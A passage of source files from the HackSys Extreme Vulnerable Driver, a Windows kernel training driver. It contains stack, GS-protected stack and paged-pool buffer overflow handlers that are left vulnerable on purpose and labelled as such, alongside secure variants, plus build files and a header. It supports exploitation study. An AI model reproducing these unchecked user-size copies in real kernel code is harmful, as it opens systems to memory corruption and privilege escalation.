        RtlCopyMemory(KernelBuffer, UserBuffer, (SIZE_T)POOL_BUFFER_SIZE);
#else
        DbgPrint("[+] Triggering Buffer Overflow in PagedPoolSession\n");

        //
        // Vulnerability Note: This is a vanilla Pool Based Overflow vulnerability
        // because the developer is passing the user supplied value directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of the allocated Pool chunk
        //

        RtlCopyMemory(KernelBuffer, UserBuffer, Size);
#endif

        if (KernelBuffer)
        {
            DbgPrint("[+] Freeing Pool chunk\n");
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelBuffer);

            //
            // Free the allocated Pool chunk
            //

            ExFreePoolWithTag(KernelBuffer, (ULONG)POOL_TAG);
            KernelBuffer = NULL;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Buffer Overflow PagedPoolSession Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
BufferOverflowPagedPoolSessionIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    SIZE_T Size = 0;
    PVOID UserBuffer = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;
    Size = IrpSp->Parameters.DeviceIoControl.InputBufferLength;

    if (UserBuffer)
    {
        Status = TriggerBufferOverflowPagedPoolSession(UserBuffer, Size);
    }

    return Status;
}

```

`Driver/HEVD/Windows/BufferOverflowPagedPoolSession.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    BufferOverflowPagedPoolSession.h

Abstract:
    This module implements the data structures for
    buffer overflow in PagedPoolSession module.

--*/

#pragma once

#ifndef __BUFFER_OVERFLOW_PAGED_POOL_SESSION_H__
#define __BUFFER_OVERFLOW_PAGED_POOL_SESSION_H__

#include "Common.h"


//
// Defines
//

#define POOL_BUFFER_SIZE 504


//
// Function Definitions
//

NTSTATUS
TriggerBufferOverflowPagedPoolSession(
    _In_ PVOID UserBuffer,
    _In_ SIZE_T Size
);

#endif  // !__BUFFER_OVERFLOW_PAGED_POOL_SESSION_H__

```

`Driver/HEVD/Windows/BufferOverflowStack.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    BufferOverflowStack.c

Abstract:
    This module implements the functions to demonstrate
    buffer overflow in Stack vulnerability.

--*/

#include "BufferOverflowStack.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, TriggerBufferOverflowStack)
#pragma alloc_text(PAGE, BufferOverflowStackIoctlHandler)
#endif // ALLOC_PRAGMA


/// <summary>
/// Trigger the buffer overflow in Stack Vulnerability
/// </summary>
/// <param name="UserBuffer">The pointer to user mode buffer</param>
/// <param name="Size">Size of the user mode buffer</param>
/// <returns>NTSTATUS</returns>
__declspec(safebuffers)
NTSTATUS
TriggerBufferOverflowStack(
    _In_ PVOID UserBuffer,
    _In_ SIZE_T Size
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    ULONG KernelBuffer[BUFFER_SIZE] = { 0 };

    PAGED_CODE();

    __try
    {
        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR));

        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserBuffer Size: 0x%zX\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%zX\n", sizeof(KernelBuffer));

#ifdef SECURE
        //
        // Secure Note: This is secure because the developer is passing a size
        // equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,
        // there will be no overflow
        //

        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));
#else
        DbgPrint("[+] Triggering Buffer Overflow in Stack\n");

        //
        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
        // because the developer is passing the user supplied size directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of KernelBuffer
        //

        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
#endif
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Buffer Overflow Stack Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
BufferOverflowStackIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    SIZE_T Size = 0;
    PVOID UserBuffer = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;
    Size = IrpSp->Parameters.DeviceIoControl.InputBufferLength;

    if (UserBuffer)
    {
        Status = TriggerBufferOverflowStack(UserBuffer, Size);
    }

    return Status;
}

```

`Driver/HEVD/Windows/BufferOverflowStack.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    BufferOverflowStack.h

Abstract:
    This module implements the data structures for
    buffer overflow in Stack module.

--*/

#pragma once

#ifndef __BUFFER_OVERFLOW_STACK_H__
#define __BUFFER_OVERFLOW_STACK_H__

#include "Common.h"


//
// Function Definitions
//

NTSTATUS
TriggerBufferOverflowStack(
    _In_ PVOID UserBuffer,
    _In_ SIZE_T Size
);

#endif  // !__BUFFER_OVERFLOW_STACK_H__

```

`Driver/HEVD/Windows/BufferOverflowStackGS.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    BufferOverflowStackGS.c

Abstract:
    This module implements the functions to demonstrate
    the use of Stack Guard/Stack Canary to protect from
    stack based buffer overflow vulnerability.

--*/

#include "BufferOverflowStackGS.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, TriggerBufferOverflowStackGS)
#pragma alloc_text(PAGE, BufferOverflowStackGSIoctlHandler)
#endif // ALLOC_PRAGMA


/// <summary>
/// Trigger the buffer overflow in Stack protected by GS Cookie
/// </summary>
/// <param name="UserBuffer">The pointer to user mode buffer</param>
/// <param name="Size">Size of the user mode buffer</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
TriggerBufferOverflowStackGS(
    _In_ PVOID UserBuffer,
    _In_ SIZE_T Size
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    UCHAR KernelBuffer[BUFFER_SIZE] = { 0 };

    PAGED_CODE();

    __try
    {
        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR));

        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserBuffer Size: 0x%zX\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%zX\n", sizeof(KernelBuffer));

#ifdef SECURE
        //
        // Secure Note: This is secure because the developer is passing a size
        // equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,
        // there will be no overflow
        //

        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));
#else
        DbgPrint("[+] Triggering Buffer Overflow in Stack (GS)\n");

        //
        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
        // because the developer is passing the user supplied size directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of KernelBuffer
        //

        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
#endif
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Buffer Overflow Stack GS Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
BufferOverflowStackGSIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    SIZE_T Size = 0;
    PVOID UserBuffer = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;
    Size = IrpSp->Parameters.DeviceIoControl.InputBufferLength;

    if (UserBuffer)
    {
        Status = TriggerBufferOverflowStackGS(UserBuffer, Size);
    }

    return Status;
}

```

`Driver/HEVD/Windows/BufferOverflowStackGS.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    BufferOverflowStackGS.h

Abstract:
    This module implements the data structures for
    buffer overflow in Stack with Guard Stack (GS) module.

--*/

#pragma once

#ifndef __BUFFER_OVERFLOW_STACK_GS_H__
#define __BUFFER_OVERFLOW_STACK_GS_H__

#include "Common.h"


//
// Function Definitions
//

NTSTATUS
TriggerBufferOverflowStackGS(
    _In_ PVOID UserBuffer,
    _In_ SIZE_T Size
);

#endif  // !__BUFFER_OVERFLOW_STACK_GS_H__

```

`Driver/HEVD/Windows/CMakeLists.txt`:

```txt

if(SECURE)
    add_definitions(-DSECURE)
    message("Generating secure HEVD build configuration")
else()
    message("Generating vulnerable HEVD build configuration")
endif()


wdk_add_driver(HEVD
    WDM
        1.15
    PFX_FILE
        HEVD.pfx
    PFX_PASSWORD
        Passw0rd!
    HackSysExtremeVulnerableDriver.c
    ArbitraryReadWriteHelperNonPagedPoolNx.c
    ArbitraryWrite.c
    BufferOverflowNonPagedPool.c
    BufferOverflowNonPagedPoolNx.c
    BufferOverflowPagedPoolSession.c
    BufferOverflowStack.c
    BufferOverflowStackGS.c
    DoubleFetch.c
    InsecureKernelResourceAccess.c
    IntegerOverflow.c
    MemoryDisclosureNonPagedPool.c
    MemoryDisclosureNonPagedPoolNx.c
    NullPointerDereference.c
    TypeConfusion.c
    UninitializedMemoryPagedPool.c
    UninitializedMemoryStack.c
    UseAfterFreeNonPagedPool.c
    UseAfterFreeNonPagedPoolNx.c
    WriteNULL.c
    ArbitraryIncrement.c
)

```

`Driver/HEVD/Windows/Common.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    Common.h

Abstract:
    This module implements the data structures which
    are common to the driver modules.

--*/

#pragma once

#ifndef __COMMON_H__
#define __COMMON_H__

#include <ntddk.h>


//
// Defines
//

#define POOL_TAG 'kcaH'
#define BUFFER_SIZE 512

#define _STRINGIFY(value) #value
#define STRINGIFY(value) _STRINGIFY(value)

#define DbgPrint(Format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, Format, __VA_ARGS__)

typedef void (*FunctionPointer)(void);


//
// Function Definitions
//

NTSTATUS
ArbitraryWriteIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
BufferOverflowNonPagedPoolIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
BufferOverflowNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
BufferOverflowPagedPoolSessionIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
BufferOverflowStackIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
BufferOverflowStackGSIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
DoubleFetchIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
InsecureKernelFileAccessIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
IntegerOverflowIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
MemoryDisclosureNonPagedPoolIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
MemoryDisclosureNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
NullPointerDereferenceIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
TypeConfusionIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
UninitializedMemoryPagedPoolIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
UninitializedMemoryStackIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
AllocateUaFObjectNonPagedPoolIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
AllocateFakeObjectNonPagedPoolIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
UseUaFObjectNonPagedPoolIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
FreeUaFObjectNonPagedPoolIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
AllocateUaFObjectNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
AllocateFakeObjectNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
UseUaFObjectNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
FreeUaFObjectNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
WriteNULLIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
CreateArbitraryReadWriteHelperObjectNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
SetArbitraryReadWriteHelperObjecNameNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
GetArbitraryReadWriteHelperObjecNameNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

NTSTATUS
ArbitraryIncrementIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
);

#endif // !__COMMON_H__

```

`Driver/HEVD/Windows/DoubleFetch.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    DoubleFetch.c

Abstract:
    This module implements the functions to demonstrate
    double fetch vulnerability.

--*/

#include "DoubleFetch.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, TriggerDoubleFetch)
#pragma alloc_text(PAGE, DoubleFetchIoctlHandler)
#endif // ALLOC_PRAGMA


/// <summary>
/// Trigger the Double Fetch Vulnerability
/// </summary>
/// <param name="UserDoubleFetch">The pointer to user mode buffer</param>
/// <returns>NTSTATUS</returns>
__declspec(safebuffers)
NTSTATUS
TriggerDoubleFetch(
    _In_ PDOUBLE_FETCH UserDoubleFetch
)
{
    PVOID UserBuffer = NULL;
    NTSTATUS Status = STATUS_SUCCESS;
